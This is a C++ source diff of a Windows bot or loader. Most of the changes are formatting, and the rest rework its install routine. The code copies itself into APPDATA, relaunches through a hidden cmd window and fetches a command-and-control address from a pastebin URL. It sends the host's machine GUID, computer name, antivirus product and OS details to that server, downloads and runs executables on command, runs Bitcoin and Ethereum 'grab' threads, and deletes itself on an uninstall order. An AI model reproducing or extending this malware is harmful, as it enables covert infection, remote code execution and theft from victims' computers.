@@ -46,7 +46,8 @@ std::string getComputerName() {
 	DWORD dwBufferSize = MAX_COMPUTERNAME_LENGTH + 1;
 	if (GetComputerName(chrComputerName, &dwBufferSize)) {
 		strRetVal = chrComputerName;
-	}else {
+	}
+	else {
 		strRetVal = "";
 	}
 	return(strRetVal);
@@ -62,7 +63,7 @@ std::string downloadFile(std::string url, std::string file) {
 	return "ok";
 }
 
-std::vector<std::string> explode(const std::string& delimiter, const std::string& str) {
+std::vector<std::string> explode(const std::string & delimiter, const std::string & str) {
 	std::vector<std::string> arr;
 	int strleng = str.length();
 	int delleng = delimiter.length();
@@ -80,7 +81,8 @@ std::vector<std::string> explode(const std::string& delimiter, const std::string
 			arr.push_back(str.substr(k, i - k));
 			i += delleng;
 			k = i;
-		}else{
+		}
+		else {
 			i++;
 		}
 	}
@@ -88,7 +90,7 @@ std::vector<std::string> explode(const std::string& delimiter, const std::string
 	return arr;
 }
 
-bool replace(std::string& str, const std::string& from, const std::string& to) {
+bool replace(std::string & str, const std::string & from, const std::string & to) {
 	size_t start_pos = str.find(from);
 	if (start_pos == std::string::npos)
 		return false;
@@ -114,12 +116,13 @@ std::string startNewProcess(std::string file) {
 
 	PROCESS_INFORMATION pi = {};
 	const TCHAR* target = TEXT(file.c_str());
-	
+
 	if (!CreateProcess(target, 0, 0, FALSE, 0, 0, 0, 0, &si, &pi))
 	{
 		std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
 		return "failed";
-	}else{
+	}
+	else {
 		std::cout << "Process Executed Success" << std::endl;
 		return "success";
 	}
@@ -128,7 +131,7 @@ std::string startNewProcess(std::string file) {
 	std::cin.ignore();
 }
 
-bool GetWinMajorMinorVersion(DWORD& major, DWORD& minor) {
+bool GetWinMajorMinorVersion(DWORD & major, DWORD & minor) {
 	bool bRetCode = false;
 	LPBYTE pinfoRawData = 0;
 	if (NERR_Success == NetWkstaGetInfo(NULL, 100, &pinfoRawData))
@@ -146,13 +149,13 @@ std::string GetWindowsVersionString() {
 	std::string     winver;
 	OSVERSIONINFOEX osver;
 	SYSTEM_INFO     sysInfo;
-	typedef void(__stdcall *GETSYSTEMINFO) (LPSYSTEM_INFO);
+	typedef void(__stdcall * GETSYSTEMINFO) (LPSYSTEM_INFO);
 
 	__pragma(warning(push))
 		__pragma(warning(disable:4996))
 		memset(&osver, 0, sizeof(osver));
 	osver.dwOSVersionInfoSize = sizeof(osver);
-	GetVersionEx((LPOSVERSIONINFO)&osver);
+	GetVersionEx((LPOSVERSIONINFO)& osver);
 	__pragma(warning(pop))
 		DWORD major = 0;
 	DWORD minor = 0;
@@ -160,7 +163,8 @@ std::string GetWindowsVersionString() {
 	{
 		osver.dwMajorVersion = major;
 		osver.dwMinorVersion = minor;
-	} else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2) {
+	}
+	else if (osver.dwMajorVersion == 6 && osver.dwMinorVersion == 2) {
 		OSVERSIONINFOEXW osvi;
 		ULONGLONG cm = 0;
 		cm = VerSetConditionMask(cm, VER_MINORVERSION, VER_EQUAL);
@@ -194,7 +198,7 @@ std::string GetWindowsVersionString() {
 	if (osver.dwMajorVersion == 5 && osver.dwMinorVersion == 0)   winver = "Windows 2000";
 	if (osver.dwMajorVersion < 5)   winver = "unknown";
 
-	if (osver.wServicePackMajor != 0){
+	if (osver.wServicePackMajor != 0) {
 		std::string sp;
 		char buf[128] = { 0 };
 		sp = " Service Pack ";
@@ -228,7 +232,7 @@ std::string ExeDir() {
 	return std::string(buffer).substr(0, pos);
 }
 
-void removeRegInstallKey(){
+void removeRegInstallKey() {
 	TCHAR path[100];
 	GetModuleFileName(NULL, path, 100);
 	HKEY newValue;
@@ -239,12 +243,12 @@ void removeRegInstallKey(){
 
 void uninstall() {
 	removeRegInstallKey();
-	std::string remove = " /C \"PING.EXE -n 5 127.0.0.1 && del "+ ExePath()+"\"";
+	std::string remove = " /C \"PING.EXE -n 5 127.0.0.1 && del " + ExePath() + "\"";
 	ShellExecute(
 		NULL,
 		_T("open"),
 		_T("cmd"),
-		_T( remove.c_str() ), // params                            
+		_T(remove.c_str()), // params                            
 		_T(" C:\ "),
 		SW_HIDE);
 }
@@ -260,7 +264,7 @@ std::string checkIfRegKeyExists(std::string key) {
 	LONG lResult;
 	HKEY hKey;
 	lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(key.c_str()), 0, KEY_READ, &hKey);
-	if (lResult != ERROR_SUCCESS){
+	if (lResult != ERROR_SUCCESS) {
 		if (lResult == ERROR_FILE_NOT_FOUND) {
 			return "false";
 		}
@@ -286,28 +290,50 @@ std::string GetMachineGUID()
 
 std::string installedOrnot() {
 	//Kill Current Place
-	std::string installPath = (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + RandomString(10) + ".exe";
+	std::string installPath = (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\";
+	std::string installFile = (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + RandomString(10) + ".exe";
 	//Check if Appdata Dir 
-	size_t found = ExePath().find("Microsoft");
-	if ( found  != std::string::npos) {
-		return "installed";
-	}else {
-		//Uninstalled Copy To AppData & Execute
-		BOOL b = CopyFile(ExePath().c_str(), installPath.c_str(), 0);
-		if (!b) {
-			std::cout << "Error: " << GetLastError() << std::endl;
-			std::cout << "Error: " << ExePath() << std::endl;
+
+	if (CreateDirectory(installPath.c_str(), NULL) ||
+		ERROR_ALREADY_EXISTS == GetLastError())
+	{
+		size_t found = ExePath().find("Microsoft");
+		if (found != std::string::npos) {
+			std::cout << found;
+			std::cout << "\n";
+			std::cout << ExePath();
+			return "installed";
+		}else {
+			//Uninstalled Copy To AppData & Execute
+			BOOL b = CopyFile(ExePath().c_str(), installFile.c_str(), 0);
+			if (!b) {
+				std::cout << "Error: " << GetLastError() << std::endl;
+				std::cout << "Error: " << ExePath() << std::endl;
+			}
+			else {
+				std::cout << "Installed " << std::endl;
+				std::string rebootString = "  /C  start " + installFile;
+				std::cout << rebootString;
+				//system(rebootString.c_str());
+				ShellExecute(
+					NULL,
+					_T("open"),
+					_T("cmd"),
+					(LPCSTR)rebootString.c_str(), // params                            
+					_T(" C:\ "),
+					SW_HIDE);
+				return "restart";
+			}
+			return "failed";
 		}
-		else {
-			std::cout << "Installed " << std::endl;
-		}
-		std::string rebootString = "start " + installPath;
-		system(rebootString.c_str());
-		return "restart";
+	}
+	else
+	{
+		return "failed";
 	}
 }
 
-std::string& BstrToStdString(const BSTR bstr, std::string& dst, int cp = CP_UTF8){
+std::string& BstrToStdString(const BSTR bstr, std::string & dst, int cp = CP_UTF8) {
 	if (!bstr)
 	{
 		// define NULL functionality. I just clear the target.
@@ -342,19 +368,19 @@ std::string getCurrentAv() {
 	std::string returnString;
 	CoInitializeEx(0, 0);
 	CoInitializeSecurity(0, -1, 0, 0, 0, 3, 0, 0, 0);
-	IWbemLocator *locator = 0;
-	CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void **)&locator);
-	IWbemServices * services = 0;
-	wchar_t *name = L"root\\SecurityCenter2";
+	IWbemLocator* locator = 0;
+	CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (void**)& locator);
+	IWbemServices* services = 0;
+	wchar_t* name = L"root\\SecurityCenter2";
 	if (SUCCEEDED(locator->ConnectServer(name, 0, 0, 0, 0, 0, 0, &services))) {
 		//printf("Connected!\n");
 		//Lets get system information
 		CoSetProxyBlanket(services, 10, 0, 0, 3, 3, 0, 0);
-		wchar_t *query = L"Select * From AntiVirusProduct";
-		IEnumWbemClassObject *e = 0;
+		wchar_t* query = L"Select * From AntiVirusProduct";
+		IEnumWbemClassObject* e = 0;
 		if (SUCCEEDED(services->ExecQuery(L"WQL", query, WBEM_FLAG_FORWARD_ONLY, 0, &e))) {
 			//printf("Query executed successfuly!\n");
-			IWbemClassObject *object = 0;
+			IWbemClassObject* object = 0;
 			ULONG u = 0;
 			//lets enumerate all data from this table
 			std::string antiVirus;
@@ -380,6 +406,7 @@ std::string getCurrentAv() {
 	return returnString;
 }
 
+
 std::string encryptDecrypt(std::string toEncrypt) {
 	Config config;
 	std::string output = toEncrypt;
@@ -392,99 +419,102 @@ std::string encryptDecrypt(std::string toEncrypt) {
 
 
 #if _DEBUG
-	int main(int argc, char* argv[]) {
+int main(int argc, char* argv[]) {
 #endif
 #if NDEBUG 
-	int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd){
+	int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 #endif
-	Config config;
+		Config config;
 
-	//Check if the Bot is Running
-	CreateMutexA(0, FALSE, "Local\\$myprogram$"); // try to create a named mutex
-	if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
-		return -1; // quit; mutex is released automatically
+		//Check if the Bot is Running
+		CreateMutexA(0, FALSE, "Local\\$myprogram$"); // try to create a named mutex
+		if (GetLastError() == ERROR_ALREADY_EXISTS) // did the mutex already exist?
+			return -1; // quit; mutex is released automatically
 
 
-	//Autostart && Clone
-	if (config.startup == true) {
-		std::string insatlled = installedOrnot();
-		if (insatlled == "restart") {
-			return 0;
+		//Autostart && Clone
+		if (config.startup == true) {
+			std::string insatlled = installedOrnot();
+			if (insatlled == "restart") {
+				return 0;
+			}
+			//	addstartup(); // Now its Droping/ wdym
 		}
-		addstartup();
-	}
 
-	//Main
-	http::Request request(config.pastebinUrl);
-	http::Response response = request.send("GET");
-	std::string gateFromPatebin = encryptDecrypt(responseToString(response));
-	std::string netFramework2 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727");
-	std::string netFramework3 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0");
-	std::string netFramework35 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5");
-	std::string netFramework4 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4");
-	std::string currentAV = getCurrentAv();
-	std::thread t1(&CoinFinder::grabBitcoin, CoinFinder());
-	std::thread t2(&CoinFinder::grabEthereum, CoinFinder());
+		//Main
+		http::Request request(config.pastebinUrl);
+		http::Response response = request.send("GET");
+		std::string gateFromPatebin = encryptDecrypt(responseToString(response));
+		std::string netFramework2 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727");
+		std::string netFramework3 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0");
+		std::string netFramework35 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5");
+		std::string netFramework4 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4");
+		std::string currentAV = getCurrentAv();
+		std::thread t1(&CoinFinder::grabBitcoin, CoinFinder());
+		std::thread t2(&CoinFinder::grabEthereum, CoinFinder());
 
-	while (true) {
-		try {
-			http::Request request2(gateFromPatebin);
-			http::Response respons2e = request2.send("POST",
-				"hwid=" + GetMachineGUID() +
-				"&username=" + encryptDecrypt(getComputerName()) +
-				"&nf2=" + encryptDecrypt(netFramework2) +
-				"&nf3=" + encryptDecrypt(netFramework3) +
-				"&nf35=" + encryptDecrypt(netFramework35) +
-				"&nf4=" + encryptDecrypt(netFramework4) +
-				"&av=" + currentAV +
-				"&os=" + GetWindowsVersionString() +
-				"&botversion=" + encryptDecrypt("2.0"),
-				{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
-			);
-			std::string responseFromGate = responseToString(respons2e);
-			//TODO Handle Tasks Function
-			//Java Support?
-			//32x64 Bit CPU (&& Model?)
-			std::cout << responseFromGate;
-			std::string substring = "newtask";
-			if (responseFromGate.find(substring) != std::string::npos) {
-				std::vector<std::string> v = explode(";", responseFromGate);
-				std::cout << "New Task Found \n";
-				std::string random_str = RandomString(10);
-				std::string url(v[2]);
-				std::string file((std::string)getenv("TEMP") + "\\" + random_str + ".exe");
-				downloadFile(url, file);
-				std::string started = startNewProcess(file);
+		while (true) {
+			try {
 				http::Request request2(gateFromPatebin);
 				http::Response respons2e = request2.send("POST",
-					"hwid=" + getHWID() +
-					"&username=" + getComputerName() +
-					"&ps=" + started +
-					"&id=" + v[1],
-					{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: "+ config.useragent }
+					"hwid=" + GetMachineGUID() +
+					"&username=" + encryptDecrypt(getComputerName()) +
+					"&nf2=" + encryptDecrypt(netFramework2) +
+					"&nf3=" + encryptDecrypt(netFramework3) +
+					"&nf35=" + encryptDecrypt(netFramework35) +
+					"&nf4=" + encryptDecrypt(netFramework4) +
+					"&av=" + currentAV +
+					"&os=" + GetWindowsVersionString() +
+					"&botversion=" + encryptDecrypt("2.0"),
+					{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
 				);
-				std::cout << started;
-			} else {
-				if (responseFromGate.find("uninstall") != std::string::npos) {
-					t1.detach();
-					t2.detach();
-					uninstall();
-					return 0;
-				}  else if (responseFromGate.find("update") != std::string::npos) {
-					std::cout << "Update Found  \n";
+				std::string responseFromGate = responseToString(respons2e);
+				//TODO Handle Tasks Function
+				//Java Support?
+				//32x64 Bit CPU (&& Model?)
+				std::cout << responseFromGate;
+				std::string substring = "newtask";
+				if (responseFromGate.find(substring) != std::string::npos) {
 					std::vector<std::string> v = explode(";", responseFromGate);
-					t1.detach();
-					t2.detach();
-					update(v[2]);
-					return 0;
-				}else {
-					std::cout << "No new Task \n";
+					std::cout << "New Task Found \n";
+					std::string random_str = RandomString(10);
+					std::string url(v[2]);
+					std::string file((std::string)getenv("TEMP") + "\\" + random_str + ".exe");
+					downloadFile(url, file);
+					std::string started = startNewProcess(file);
+					http::Request request2(gateFromPatebin);
+					http::Response respons2e = request2.send("POST",
+						"hwid=" + getHWID() +
+						"&username=" + getComputerName() +
+						"&ps=" + started +
+						"&id=" + v[1],
+						{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
+					);
+					std::cout << started;
+				}
+				else {
+					if (responseFromGate.find("uninstall") != std::string::npos) {
+						t1.detach();
+						t2.detach();
+						uninstall();
+						return 0;
+					}
+					else if (responseFromGate.find("update") != std::string::npos) {
+						std::cout << "Update Found  \n";
+						std::vector<std::string> v = explode(";", responseFromGate);
+						t1.detach();
+						t2.detach();
+						update(v[2]);
+						return 0;
+					}
+					else {
+						std::cout << "No new Task \n";
+					}
 				}
 			}
+			catch (const std::exception & e) {
+				std::cerr << "Request failed, error: " << e.what() << std::endl;
+			}
+			Sleep(10000);
 		}
-		catch (const std::exception & e) {
-			std::cerr << "Request failed, error: " << e.what() << std::endl;
-		}
-		Sleep(10000);
 	}
-}
